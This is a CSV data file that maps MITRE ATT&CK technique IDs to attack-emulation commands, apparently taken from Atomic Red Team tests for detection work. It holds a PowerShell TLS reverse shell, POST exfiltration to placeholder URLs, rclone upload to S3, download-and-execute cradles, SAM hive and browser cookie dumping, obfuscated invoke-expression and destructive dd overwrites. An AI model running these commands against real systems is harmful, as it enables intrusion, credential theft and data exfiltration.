mitre_id,command
T1567,"WRITE-HOST ""DEPLOYING AWS INFRASTRUCTURE... "" -NONEWLINE $AWSACCESSKEY = ""#{AWS_ACCESS_KEY}"" $AWSSECRETKEY = ""#{AWS_SECRET_KEY}"" CD PATHTOATOMICSFOLDER/T1567.002/SRC/ IF ($AWSACCESSKEY -EQ """" -OR $AWSSECRETKEY -EQ """") { $ENV:AWS_PROFILE = ""#{AWS_PROFILE}"" } ELSE { $ENV:AWS_ACCESS_KEY_ID = ""$AWSACCESSKEY"" $ENV:AWS_SECRET_ACCESS_KEY = ""$AWSSECRETKEY"" } $NULL = PATHTOATOMICSFOLDER/../EXTERNALPAYLOADS/T1567.002/TERRAFORM-V*/TERRAFORM INIT $NULL = PATHTOATOMICSFOLDER/../EXTERNALPAYLOADS/T1567.002/TERRAFORM-V*/TERRAFORM APPLY -VAR ""AWS_REGION=#{AWS_REGION}"" -AUTO-APPROVE WRITE-HOST ""DONE!"" WRITE-HOST ""GENERATING RCLONE CONFIG... "" -NONEWLINE $CONFIG = @"" [EXFILS3] TYPE = S3 PROVIDER = AWS ENV_AUTH = TRUE REGION = #{AWS_REGION} ""@ $CONFIG | OUT-FILE -FILEPATH ""PATHTOATOMICSFOLDER/../EXTERNALPAYLOADS/T1567.002/RCLONE.CONF"" -ENCODING ASCII WRITE-HOST ""DONE!"" WRITE-HOST ""EXFILTRATING DATA... "" -NONEWLINE $BUCKET = ""$(PATHTOATOMICSFOLDER/../EXTERNALPAYLOADS/T1567.002/TERRAFORM-V*/TERRAFORM OUTPUT BUCKET)"".REPLACE(""`"""","""") CD PATHTOATOMICSFOLDER/../EXTERNALPAYLOADS/T1567.002/RCLONE-V* $NULL = ./RCLONE COPY --MAX-SIZE 1700K ""PATHTOATOMICSFOLDER/../EXTERNALPAYLOADS/T1567.002/DATA/"" EXFILS3:$BUCKET --CONFIG ""PATHTOATOMICSFOLDER/../EXTERNALPAYLOADS/T1567.002/RCLONE.CONF"" WRITE-HOST ""DONE!"""
T1649,"$archive=""$env:public\t1649\atomic_certs.zip"" $exfilpath=""$env:public\t1649\certs"" add-type -assembly ""system.io.compression.filesystem"" remove-item $(split-path $exfilpath) -recurse -force -erroraction ignore mkdir $exfilpath | out-null foreach ($cert in (gci cert:\currentuser\my)) { export-certificate -cert $cert -filepath $exfilpath\$($cert.friendlyname).cer} [io.compression.zipfile]::createfromdirectory($exfilpath, $archive) # id_8511"
T1036,"COPY-ITEM ""$ENV:WINDIR\SYSTEM32\CMD.EXE"" -DESTINATION ""$ENV:ALLUSERSPROFILE\CMD.EXE"" START-PROCESS ""$ENV:ALLUSERSPROFILE\CMD.EXE"" SLEEP -S 5 STOP-PROCESS -NAME ""CMD"" | OUT-NULL"
T1059,"for i in $(seq 1 5); do echo ""$i, atomic red team was here!""; sleep 1; done"
T1612,docker build -t t1612 $pathtoatomicsfolder/t1612/src/ docker run --name t1612_container --rm -d -t t1612 docker exec t1612_container ./test.sh  
T1176,"# chromium $chromium = ""https://commondatastorage.googleapis.com/chromium-browser-snapshots/win_x64/1153778/chrome-win.zip"" # ublock origin lite to test side-loading $extension = ""https://github.com/ublockorigin/ubol-home/releases/download/ubolite_2024.11.25.1376/ubolite_2024.11.25.1376.chromium.mv3.zip"" set-location ""#{working_dir}"" set-variable progresspreference silentlycontinue invoke-webrequest -uri $chromium -outfile ""#{working_dir}\chrome.zip"" invoke-webrequest -uri $extension -outfile ""#{working_dir}\extension.zip"" expand-archive chrome.zip -destinationpath ""#{working_dir}"" -force expand-archive extension.zip -force start-process .\chrome-win\chrome.exe --load-extension=""#{working_dir}\extension\"" -passthru # id_7977"
T1562,"reg add ""hkcu\software\policies\microsoft\windows\oobe"" /v disableprivacyexperience /t reg_dword /d 1 /f"
T1082,"$s3cur3th1ssh1t_repo = 'https://raw.githubusercontent.com/s3cur3th1ssh1t' iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/powersharppack/master/powersharpbinaries/invoke-seatbelt.ps1') invoke-seatbelt -command ""-group=all"""
T1202,"scriptrunner.exe -appvscript ""#{payload_path}""   "
T1132,"$plaintext = ([system.text.encoding]::utf8.getbytes(""#{plaintext}"")) $key = ""#{key}"" $cyphertext = @(); for ($i = 0; $i -lt $plaintext.count; $i++) { $cyphertext += $plaintext[$i] -bxor $key[$i % $key.length]; } $cyphertext = [system.text.encoding]::utf8.getstring($cyphertext) [system.net.servicepointmanager]::expect100continue = $false invoke-webrequest -uri #{destination_url} -method post -body $cyphertext -disablekeepalive # id_6146"
T1069,"if [ -x ""$(command -v dscacheutil)"" ]; then dscacheutil -q group; else echo ""dscacheutil is missing from the machine. skipping...""; fi; if [ -x ""$(command -v dscl)"" ]; then dscl . -list /groups; else echo ""dscl is missing from the machine. skipping...""; fi; if [ -x ""$(command -v groups)"" ]; then groups; else echo ""groups is missing from the machine. skipping...""; fi; if [ -x ""$(command -v id)"" ]; then id; else echo ""id is missing from the machine. skipping...""; fi; if [ -x ""$(command -v getent)"" ]; then getent group; else echo ""getent is missing from the machine. skipping...""; fi; cat /etc/group # id_7651"
T1566,"# add user32.dll for keybd_event add-type @"" using system; using system.runtime.interopservices; public class k { [dllimport(""user32.dll"")] public static extern void keybd_event(byte bvk, byte bscan, uint dwflags, uintptr dwextrainfo); } ""@ # virtual key codes $vk_lwin, $vk_r, $keydown, $keyup = 0x5b, 0x52, 0x0000, 0x0002 # open run dialog (win+r) [k]::keybd_event($vk_lwin, 0, $keydown, [uintptr]::zero) [k]::keybd_event($vk_r, 0, $keydown, [uintptr]::zero) [k]::keybd_event($vk_r, 0, $keyup, [uintptr]::zero) [k]::keybd_event($vk_lwin, 0, $keyup, [uintptr]::zero) # short delay for run dialog start-sleep -milliseconds 500 add-type -assemblyname system.windows.forms [system.windows.forms.sendkeys]::sendwait(""cmd /c powershell -ec "" + [convert]::tobase64string([system.text.encoding]::unicode.getbytes('#{execution_command}')) + ""{enter}"") # id_8924"
T1057,taskmgr.exe /7
T1049,get-nettcpconnection   
T1005,"cd $home curl -o #{remote_url}/art curl -o #{remote_url}/gta.db curl -o #{remote_url}/sqlite_dump.sh chmod +x sqlite_dump.sh find . ! -executable -exec bash -c 'if [[ ""$(head -c 15 {} | strings)"" == ""sqlite format 3"" ]]; then echo ""{}""; ./sqlite_dump.sh {}; fi' \;"
T1027,"$cmdwhy =[type](""{0}{1}"" -f 's','tring') ; $pz2sb0 =[type](""{1}{0}{2}""-f'nv','co','ert') ; &(""{0}{2}{3}{1}{4}"" -f'in','sio','voke-exp','res','n') ( (&(""{1}{2}{0}""-f'ble','get-','varia') ('cmdw'+'h'+'y')).""v`alue""::(""{1}{0}"" -f'in','jo').invoke('',( (127, 162,151, 164,145 ,55 , 110 ,157 ,163 , 164 ,40,47, 110 , 145 ,154, 154 ,157 , 54 ,40, 146, 162 , 157,155 ,40, 120, 157 ,167,145 , 162 ,123,150 ,145 , 154 , 154 , 41,47)| .('%') { ( [char] ( $pz2sb0::""t`oint`16""(( [string]${_}) ,8)))})) ) # id_6939"
T1112,"reg add ""hklm\system\currentcontrolset\control\session manager\memory management\prefetchparameters"" /v ""enableprefetcher"" /t reg_dword /d 0 /f # id_3594"
T1123,$mic = get-audiodevice -recording set-audiodevice -id $mic.id start-sleep -seconds 5
T1016,"""pathtoatomicsfolder\..\externalpayloads\adfind.exe"" -f (objectcategory=subnet) #{optional_args}  "
T1095,"cmd /c ""#{ncat_exe}"" #{server_ip} #{server_port} # id_8152"
T1087,"(([adsisearcher]'').searchroot).path | %{if(([adsi]""$_"").gplink){write-host ""[+] domain path:""([adsi]""$_"").path;$a=((([adsi]""$_"").gplink) -replace ""[[;]"" -split ""]"");for($i=0;$i -lt $a.length;$i++){if($a[$i]){write-host ""policy path[$i]:""([adsi]($a[$i]).substring(0,$a[$i].length-1)).path;write-host ""policy name[$i]:""([adsi]($a[$i]).substring(0,$a[$i].length-1)).displayname} };write-output ""`n"" }} "
T1033,users w who
T1611,"echo ""current user: #{username}"" sudo -u docker_user sh -c ""sudo docker run -v /:/mnt --rm --name t1611_privesc -it alpine chroot /mnt id"""
T1120,"get-wmiobject win32_pnpentity | format-table name, description, manufacturer > $env:temp\t1120_collection.txt $space,$heading,$break,$data = get-content $env:temp\t1120_collection.txt @($heading; $break; $data |sort-object -unique) | ? {$_.trim() -ne """" } |set-content $env:temp\t1120_collection.txt"
T1137,"$excelapp = new-object -comobject ""excel.application"" if(-not $excelapp.path.contains(""program files (x86)"")){ write-host ""64-bit office"" $excelapp.registerxll(""pathtoatomicsfolder\t1137.006\bin\addins\excelxll_x64.xll"") } else{ write-host ""32-bit office"" $excelapp.registerxll(""pathtoatomicsfolder\t1137.006\bin\addins\excelxll_x86.xll"") }"
T1083,"echo """" | ""#{plink_file}"" ""#{vm_host}"" -ssh -l ""#{vm_user}"" -pw ""#{vm_pass}"" -m ""#{cli_script}"""
T1195,"kubectl run #{pod_name} --image=#{image_name} --restart=never --attach --rm -i -- bash -lc ""mkdir -p /tmp/test && cd /tmp/test && npm init -y >/dev/null 2>&1 && echo '--- package.json before install ---' && cat package.json && npm install #{package_name} --no-audit --no-fund --no-package-lock && echo '--- package.json after install ---' && cat package.json"" # id_3376"
T1006,"$buffer = new-object byte[] 11 $handle = new-object io.filestream ""\\.\#{volume}"", 'open', 'read', 'readwrite' $handle.read($buffer, 0, $buffer.length) $handle.close() format-hex -inputobject $buffer "
T1552,"EXPORT AWS_REGION=#{AWS_REGION} CD #{STRATUS_PATH} ECHO ""STARTING WARMUP"" ./STRATUS WARMUP AWS.CREDENTIAL-ACCESS.EC2-GET-PASSWORD-DATA ECHO ""STARTING DETONATE"" ./STRATUS DETONATE AWS.CREDENTIAL-ACCESS.EC2-GET-PASSWORD-DATA --FORCE"
T1526,"import-module ""pathtoatomicsfolder\t1526\src\awsdiscovery.ps1"" $access_key = ""#{access_key}"" $secret_key = ""#{secret_key}"" $session_token = ""#{session_token}"" $aws_profile = ""#{profile}"" $regions = ""#{regions}"" set-awsauthentication -accesskey $access_key -secretkey $secret_key -sessiontoken $session_token -awsprofile $aws_profile get-awsdiscoverydata -regions $regions -outputdirectory ""#{output_directory}"" remove-blankfiles -outputdirectory ""#{output_directory}"" "
T1654,POWERSHELL -C {GET-EVENTLOG 'SECURITY' | WHERE {$_.MESSAGE -LIKE '*SYSTEM*'} | EXPORT-CSV $ENV:TEMP\T1654_EVENTS.TXT}
T1592,"get-ciminstance -query ""select * from win32_pnpentity where (pnpclass = 'image' or pnpclass = 'camera')"" # id_8969"
T1571,echo quit | telnet #{domain} #{port} exit 0 # id_6650
T1072,# deploy 7-zip using chocolatey choco install -y 7zip
T1113,"reg add ""hkey_current_user\software\policies\microsoft\windows\windowsai"" /v disableaidataanalysis /t reg_dword /d 0 /f reg delete ""hkey_current_user\software\policies\microsoft\windows\windowsai"" /v disableaidataanalysis /f "
T1578,GCLOUD COMPUTE SNAPSHOTS CREATE #{GCP_SNAPSHOT_NAME} --SOURCE-DISK=#{GCP_DISK_NAME} --ZONE=#{GCP_ZONE}
T1127,"#{msbuildpath}\#{msbuildname} ""#{filename}"""
T1485,DD OF=#{FILE_TO_OVERWRITE} IF=#{OVERWRITE_SOURCE} COUNT=$(LS -L #{FILE_TO_OVERWRITE} | AWK '{PRINT $5}') IFLAG=COUNT_BYTES
T1573,"$server_ip = #{server_ip} $server_port = #{server_port} $socket = new-object net.sockets.tcpclient('#{server_ip}', '#{server_port}') $stream = $socket.getstream() $sslstream = new-object system.net.security.sslstream($stream,$false,({$true} -as [net.security.remotecertificatevalidationcallback])) $sslstream.authenticateasclient('fakedomain.example', $null, ""tls12"", $false) $writer = new-object system.io.streamwriter($sslstream) $writer.write('ps ' + (pwd).path + '> ') $writer.flush() [byte[]]$bytes = 0..65535|%{0}; while(($i = $sslstream.read($bytes, 0, $bytes.length)) -ne 0) {$data = (new-object -typename system.text.asciiencoding).getstring($bytes,0, $i); $sendback = (iex $data | out-string ) 2>&1; $sendback2 = $sendback + 'ps ' + (pwd).path + '> '; $sendbyte = ([text.encoding]::ascii).getbytes($sendback2); $sslstream.write($sendbyte,0,$sendbyte.length);$sslstream.flush()}"
T1595,"IMPORT-MODULE ""PATHTOATOMICSFOLDER/T1595.003/SRC/WEBSERVERSCAN.PS1"" INVOKE-WORDLISTSCAN -TARGET ""#{TARGET}"" -WORDLIST ""#{WORDLIST}"" -TIMEOUT ""#{REQUEST_TIMEOUT}"" -OUTPUTFILE ""#{OUTPUT_FILE}"" WRITE-HOST ""SCAN COMPLETE. RESULTS SAVED TO: #{OUTPUT_FILE}"""
T1069,"if [ -x ""$(command -v dscacheutil)"" ]; then dscacheutil -q group; else echo ""dscacheutil is missing from the machine. skipping...""; fi; if [ -x ""$(command -v dscl)"" ]; then dscl . -list /groups; else echo ""dscl is missing from the machine. skipping...""; fi; if [ -x ""$(command -v groups)"" ]; then groups; else echo ""groups is missing from the machine. skipping...""; fi; if [ -x ""$(command -v id)"" ]; then id; else echo ""id is missing from the machine. skipping...""; fi; if [ -x ""$(command -v getent)"" ]; then getent group; else echo ""getent is missing from the machine. skipping...""; fi; cat /etc/group"
T1489,sc.exe stop #{service_name} 
T1197,start-bitstransfer -priority foreground -source #{remote_file} -destination #{local_file}
T1574,ld_preload=#{path_to_shared_library} ls
T1091,"$removabledrives=@() $removabledrives = get-wmiobject -class win32_logicaldisk -filter ""drivetype=2"" | select-object -expandproperty deviceid foreach ($drive in $removabledrives) { write-host ""removable drive found:"" $drive new-item -path $drive/t1091test1.txt -itemtype ""file"" -force -value ""t1091 test 1 has created this file to simulate malware spread to removable drives."" }"
T1016,ipconfig /all net config workstation net view /all /domain nltest /domain_trusts 
T1074,curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/t1074.001/src/discovery.sh | sh -s > #{output_file} # id_8239
T1530,aws --no-sign-request s3 cp --recursive s3://#{s3_bucket_name} /tmp/#{s3_bucket_name}   
T1543,"copy ""#{dllfilename}"" %systemroot%\system32\ sc create w64time binpath= ""c:\windows\system32\svchost.exe -k timeservice"" type= share start=auto sc config w64time displayname= ""windows 64 time"" sc description w64time ""maintain date and time synch on all clients and services in the network"" reg add ""hklm\software\microsoft\windows nt\currentversion\svchost"" /v timeservice /t reg_multi_sz /d ""w64time"" /f reg add ""hklm\system\currentcontrolset\services\w64time\parameters"" /v servicedll /t reg_expand_sz /d ""%systemroot%\system32\w64time.dll"" /f sc start w64time"
T1562,"echo ""block in proto tcp from 1.2.3.4 to any"" | pfctl -a pf-rules -f - pfctl -a pf-rules -s rules"
T1560,zip #{output_file} #{input_files}
T1195,"copy %temp%\explorersync.db %temp%\..\microsoft\explorersync.db schtasks /create /tn explorersync /tr ""javaw -jar %temp%\..\microsoft\explorersync.db"" /sc minute /f"
T1530,aws --no-sign-request s3 cp --recursive s3://#{s3_bucket_name} /tmp/#{s3_bucket_name} # id_8144
T1573,"$server_ip = #{server_ip} $server_port = #{server_port} $socket = new-object net.sockets.tcpclient('#{server_ip}', '#{server_port}') $stream = $socket.getstream() $sslstream = new-object system.net.security.sslstream($stream,$false,({$true} -as [net.security.remotecertificatevalidationcallback])) $sslstream.authenticateasclient('fakedomain.example', $null, ""tls12"", $false) $writer = new-object system.io.streamwriter($sslstream) $writer.write('ps ' + (pwd).path + '> ') $writer.flush() [byte[]]$bytes = 0..65535|%{0}; while(($i = $sslstream.read($bytes, 0, $bytes.length)) -ne 0) {$data = (new-object -typename system.text.asciiencoding).getstring($bytes,0, $i); $sendback = (iex $data | out-string ) 2>&1; $sendback2 = $sendback + 'ps ' + (pwd).path + '> '; $sendbyte = ([text.encoding]::ascii).getbytes($sendback2); $sslstream.write($sendbyte,0,$sendbyte.length);$sslstream.flush()}"
T1120,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/winpwn/121dcee26a7aca368821563cbe92b2b5638c5773/winpwn.ps1') printercheck -noninteractive -consoleoutput
T1176,"# chromium $chromium = ""https://commondatastorage.googleapis.com/chromium-browser-snapshots/win_x64/1153778/chrome-win.zip"" # ublock origin lite to test side-loading $extension = ""https://github.com/ublockorigin/ubol-home/releases/download/ubolite_2024.11.25.1376/ubolite_2024.11.25.1376.chromium.mv3.zip"" set-location ""#{working_dir}"" set-variable progresspreference silentlycontinue invoke-webrequest -uri $chromium -outfile ""#{working_dir}\chrome.zip"" invoke-webrequest -uri $extension -outfile ""#{working_dir}\extension.zip"" expand-archive chrome.zip -destinationpath ""#{working_dir}"" -force expand-archive extension.zip -force start-process .\chrome-win\chrome.exe --load-extension=""#{working_dir}\extension\"" -passthru   "
T1021,"reg add ""hkey_local_machine\system\currentcontrolset\control\terminal server\winstations\rdp-tcp"" /v userauthentication /d 0 /t reg_dword /f"
T1592,"get-ciminstance -query ""select * from win32_pnpentity where (pnpclass = 'image' or pnpclass = 'camera')"""
T1059,"start-process ""#{script_path}"""
T1016,netsh advfirewall firewall show rule name=all
T1497,"$error.clear() get-wmiobject -query ""select * from msacpi_thermalzonetemperature"" -erroraction silentlycontinue if($error) {echo ""virtualization environment detected""}"
T1518,"reg query ""hkey_local_machine\software\microsoft\internet explorer"" /v svcversion # id_7816"
T1202,"scriptrunner.exe -appvscript ""#{payload_path}"" "
T1176,"# chromium $chromium = ""https://commondatastorage.googleapis.com/chromium-browser-snapshots/win_x64/1153778/chrome-win.zip"" # ublock origin lite to test side-loading $extension = ""https://github.com/ublockorigin/ubol-home/releases/download/ubolite_2024.11.25.1376/ubolite_2024.11.25.1376.chromium.mv3.zip"" set-location ""#{working_dir}"" set-variable progresspreference silentlycontinue invoke-webrequest -uri $chromium -outfile ""#{working_dir}\chrome.zip"" invoke-webrequest -uri $extension -outfile ""#{working_dir}\extension.zip"" expand-archive chrome.zip -destinationpath ""#{working_dir}"" -force expand-archive extension.zip -force start-process .\chrome-win\chrome.exe --load-extension=""#{working_dir}\extension\"" -passthru  "
T1197,"set ""#{download_path}"" && cmd /c desktopimgdownldr.exe /lockscreenurl:#{remote_file} /eventname:desktopimgdownldr # id_6845"
T1136,"net user ""#{username}"" ""#{password}"" /add /domain net group ""#{group}"" ""#{username}"" /add /domain  "
T1572,nohup #{binary_path} tunnel --url #{url_to_tunnel} #{additional_args} >/dev/null 2>&1 & # id_6334
T1518,powershell get-ciminstance -namespace root/securitycenter2 -classname antivirusproduct powershell get-wmiobject -namespace root\securitycenter2 -class antivirusproduct 
T1071,iex (new-object system.net.webclient).downloadstring('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1') start-dnscat2 -domain #{domain} -dnsserver #{server_ip} # id_4287
T1072,"""%programfiles(x86)%/#{pdq_deploy_exe}"" "
T1021,sudo /system/library/coreservices/remotemanagement/ardagent.app/contents/resources/kickstart -activate -configure -allowaccessfor -allusers -privs -all -quiet  
T1612,docker build -t t1612 $pathtoatomicsfolder/t1612/src/ docker run --name t1612_container --rm -d -t t1612 docker exec t1612_container ./test.sh
T1539,"stop-process -name ""chrome"" -force -erroraction silentlycontinue ""select host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly from [cookies];"" | cmd /c #{sqlite3_path} ""#{cookie_db}"" | out-file -filepath ""#{output_file}"""
T1095,"cmd /c ""#{ncat_exe}"" #{server_ip} #{server_port}"
T1574,dyld_insert_libraries=#{dylib_file} #{file_to_inject}
T1069,"([adsisearcher]""objectcategory=group"").findall(); ([adsisearcher]""objectcategory=group"").findone() # id_8743"
T1027,go run #{input_file}
T1201,net accounts /domain # id_3030
T1615,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/winpwn/121dcee26a7aca368821563cbe92b2b5638c5773/winpwn.ps1') gporemoteaccesspolicy -consoleoutput -noninteractive # id_9606
T1595,"import-module ""pathtoatomicsfolder/t1595.003/src/webserverscan.ps1"" invoke-wordlistscan -target ""#{target}"" -wordlist ""#{wordlist}"" -timeout ""#{request_timeout}"" -outputfile ""#{output_file}"" write-host ""scan complete. results saved to: #{output_file}"" "
T1124,"reg query ""hklm\system\currentcontrolset\control\timezoneinformation"" /v timezonekeyname"
T1030,"$file = [system.io.file]::openread(#{source_file_path}) $chunksize = #{chunk_size} * 1kb $buffer = new-object byte[] $chunksize while ($bytesread = $file.read($buffer, 0, $buffer.length)) { $encodedchunk = [convert]::tobase64string($buffer, 0, $bytesread) invoke-webrequest -uri #{destination_url} -method post -body $encodedchunk } $file.close()"
T1136,useradd -m -n -r -s /bin/bash -c evil_account #{username}
T1187,rpcping -s #{server_ip} -e #{custom_port} /a connect /u ntlm 1>$null 
T1124,w32tm /stripchart /computer:localhost /period:5 /dataonly /samples:2
T1619,"try{$response = invoke-webrequest ""https://#{base_name}.blob.core.windows.net/#{container_name}/#{blob_name}"" -method ""get""} catch [system.net.webexception] {if($_.exception.response -ne $null) {$response = $_.exception.response.getresponsestream() $readresponse = new-object system.io.streamreader($response) $readresponse.basestream.position = 0 $responsebody = $readresponse.readtoend()} else {$responsebody = ""the storage account could not be anonymously accessed.""}} ""response received for #{base_name}.blob.core.windows.net/#{container_name}/#{blob_name}: $responsebody"" | out-file -filepath #{output_file} -append"
T1087,cat /etc/passwd > #{output_file} cat #{output_file} 
T1012,"NEW-PSDRIVE -PSPROVIDER REGISTRY -ROOT HKEY_CLASSES_ROOT -NAME HKCR GET-CHILDITEM -PATH HKCR:\CLSID -NAME | SELECT -SKIP 1 > $ENV:TEMP\CLSIDS.TXT FOREACH($CLSID IN GET-CONTENT ""$ENV:TEMP\CLSIDS.TXT"") {TRY{WRITE-OUTPUT ""$($POSITION)-$($CLSID)"" WRITE-OUTPUT ""------------""| OUT-FILE #{OUTPUT_FILE} -APPEND WRITE-OUTPUT $($CLSID)| OUT-FILE #{OUTPUT_FILE} -APPEND $HANDLE=[ACTIVATOR]::CREATEINSTANCE([TYPE]::GETTYPEFROMCLSID($CLSID)) $HANDLE | GET-MEMBER -ERRORACTION SILENTLYCONTINUE | OUT-FILE #{OUTPUT_FILE} -APPEND $POSITION += 1} CATCH{}}"
T1595,"import-module ""pathtoatomicsfolder/t1595.003/src/webserverscan.ps1"" invoke-wordlistscan -target ""#{target}"" -wordlist ""#{wordlist}"" -timeout ""#{request_timeout}"" -outputfile ""#{output_file}"" write-host ""scan complete. results saved to: #{output_file}"""
T1046,nmap -pn -sv -p #{port_range} #{host} 
T1574,"set dotnet_startup_hooks=""#{preloader_dll}"" dotnet -h > nul echo."
T1217,"$URL_REGEX = '(HTT(P|S))://([\W-]+\.)+[\W-]+(/[\W- ./?%&=]*)*?' $HISTORY = GET-CONTENT -PATH ""#{HISTORY_PATH}"" | SELECT-STRING -ALLMATCHES $URL_REGEX | FOREACH-OBJECT { $_.MATCHES.VALUE } | SORT -UNIQUE $HISTORY | OUT-FILE -FILEPATH ""#{DEST_PATH}"""
T1003,reg save HKLM\SAM c:\users\public\cache.dat
T1120,"get-wmiobject win32_pnpentity | format-table name, description, manufacturer > $env:temp\t1120_collection.txt $space,$heading,$break,$data = get-content $env:temp\t1120_collection.txt @($heading; $break; $data |sort-object -unique) | ? {$_.trim() -ne """" } |set-content $env:temp\t1120_collection.txt # id_1982"
T1140,encoded=$(echo '#{message}' | b64encode -r -) printf $encoded | b64decode -r echo $encoded | b64decode -r echo $(echo $encoded) | b64decode -r echo $encoded > #{encoded_file} && b64encode -r #{encoded_file} echo $encoded > #{encoded_file} && b64decode -r < #{encoded_file} echo $encoded > #{encoded_file} && cat #{encoded_file} | b64decode -r echo $encoded > #{encoded_file} && cat < #{encoded_file} | b64decode -r  
T1047,"wmic /node:#{node} process call create ""rundll32.exe \""#{dll_to_execute}\"" #{function_to_execute}"""
T1106,$pathtoatomicsfolder\t1106\bin\x64\syscall.exe -debug
T1110,"cd ""pathtoatomicsfolder\..\externalpayloads"" .\kerbrute.exe bruteforce --dc #{domaincontroller} -d #{domain} ""pathtoatomicsfolder\..\externalpayloads\bruteforce.txt"""
T1098,"import-module -name az.resources $pword = convertto-securestring -string ""#{password}"" -asplaintext -force $credential = new-object -typename system.management.automation.pscredential -argumentlist ""#{username}"", $pword connect-azaccount -credential $credential $sp = get-azadserviceprincipal | where-object {$_.displayname -eq ""#{service_principal_name}""} if ($sp -eq $null) { write-warning ""service principal not found""; exit } $subscription = get-azsubscription | where-object {$_.name -eq ""#{subscription}""} if ($subscription -eq $null) { write-warning ""subscription not found""; exit } $role = get-azroledefinition | where-object {$_.name -eq ""#{role_name}""} if ($role -eq $null) { write-warning ""role not found""; exit } new-azroleassignment -objectid $sp.id -roledefinitionid $role.id -scope /subscriptions/$subscription write-host ""service principal $($sp.displayname) was added to $($role.name) role in subscriptions $($subscriptions.name)"" "
T1129,"#{pscp_file} -pw #{vm_pass} #{vib_file} #{vm_user}@#{vm_host}:/tmp echo """" | ""#{plink_file}"" ""#{vm_host}"" -ssh -l ""#{vm_user}"" -pw ""#{vm_pass}"" -m ""#{vib_install}""   "
T1010,"c:\windows\microsoft.net\framework\v4.0.30319\csc.exe -out:#{output_file_name} ""#{input_source_code}"" #{output_file_name}"
T1559,"""pathtoatomicsfolder\..\externalpayloads\build\namedpipes_executor.exe"" --pipe 2"
T1543,sudo cp #{script_location} #{script_destination} sudo touch /private/var/db/emondclients/#{empty_file}   
T1518,powershell get-ciminstance -namespace root/securitycenter2 -classname antivirusproduct powershell get-wmiobject -namespace root\securitycenter2 -class antivirusproduct
T1546,"reg add ""hkcu\software\microsoft\office\16.0\word\options"" /v startup-path /t reg_sz /d ""c:\users\%username%\appdata\roaming\microsoft\windows\recent"" /f"
T1087,"get-adcomputer -searchscope subtree -filter ""name -like '*'"" -properties *"
T1132,echo -n 111-11-1111 | b64encode -r - curl -xpost #{base64_data}.#{destination_url}
T1071,"CURL -S -A ""HTTPBROWSER/1.0"" -M3 #{DOMAIN} CURL -S -A ""WGET/1.9+CVS-STABLE (RED HAT MODIFIED)"" -M3 #{DOMAIN} CURL -S -A ""OPERA/8.81 (WINDOWS NT 6.0; U; EN)"" -M3 #{DOMAIN} CURL -S -A ""*<|>*"" -M3 #{DOMAIN}"
T1140,certutil -encode #{executable} %temp%\t1140_calc.txt certutil -decode %temp%\t1140_calc.txt %temp%\t1140_calc_decoded.exe
T1049,"get-nettcpconnection | foreach-object { $p = get-process -id $_.owningprocess -erroraction silentlycontinue [pscustomobject]@{ local = ""$($_.localaddress):$($_.localport)"" remote = ""$($_.remoteaddress):$($_.remoteport)"" state = $_.state pid = $_.owningprocess process = if ($p) { $p.processname } else { $null } } } | sort-object state,process | format-table -autosize"
T1041,"if(-not (test-path #{filepath})){ 1..100 | foreach-object { add-content -path #{filepath} -value ""this is line $_."" } } [system.net.servicepointmanager]::expect100continue = $false $filecontent = get-content -path #{filepath} invoke-webrequest -uri #{destination_url} -method post -body $filecontent -disablekeepalive"
T1547,"set-itemproperty ""hklm:\software\microsoft\windows nt\currentversion\winlogon\"" ""shell"" ""explorer.exe, #{binary_to_execute}"" -force"
T1039,copy \\#{remote}\c$\#{share_file} %temp%\#{local_file}
T1105,"$datepath = ""certutil-$(get-date -format yyyy_mm_dd)"" new-item -path $datepath -itemtype directory set-location $datepath certutil -verifyctl -split -f #{remote_file} get-childitem | where-object {$_.name -notlike ""*.txt""} | foreach-object { move-item $_.name -destination #{local_path} }"
T1057,get-process 
T1072,"""%programfiles(x86)%/#{pdq_deploy_exe}"""
